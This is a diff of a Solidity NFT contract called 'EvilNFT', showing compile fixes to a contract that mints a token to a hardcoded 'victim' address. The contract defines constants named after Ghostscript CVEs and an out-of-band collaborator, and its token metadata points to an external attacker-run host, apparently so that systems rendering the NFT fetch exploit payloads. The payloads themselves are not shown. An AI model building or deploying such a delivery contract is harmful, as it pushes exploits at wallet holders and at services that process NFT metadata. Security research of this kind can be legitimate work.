@@ -2,11 +2,11 @@
 pragma solidity ^0.8.0;
 
 // import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
-import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/utils/Strings.sol";
 
-contract EvilNFT is ERC721, Ownable {
+contract EvilNFT is ERC721Enumerable, Ownable {
 	using Strings for uint256;
     uint256 public constant GHOSTSCRIPT_CVE_2017_8291  = 0;
     uint256 public constant GHOSTSCRIPT_CVE_2018_16509 = 1;
@@ -46,11 +46,11 @@ contract EvilNFT is ERC721, Ownable {
     uint256 public constant COLLABORATOR    = 35;
 
     constructor() ERC721("hack721", "HACK721") {
-		address victim = 0x321639c6572de66253dec41a959cd00137f1d476;
-		_mint(victim, 1);
+		address victim = 0x321639C6572dE66253DeC41a959cD00137f1D476;
+		_mint(victim, 0);
     }   
 
-	function _baseURI() internal view virtual returns (string memory) {
+	function _baseURI() internal view virtual override returns (string memory) {
         return "https://evil-nft-h1kk4.vercel.app/api/";
     }
 
@@ -59,6 +59,6 @@ contract EvilNFT is ERC721, Ownable {
 
         string memory baseURI = _baseURI();
 		string memory json = ".json";
-        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString(), json)) : "";
+        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
     }
 }
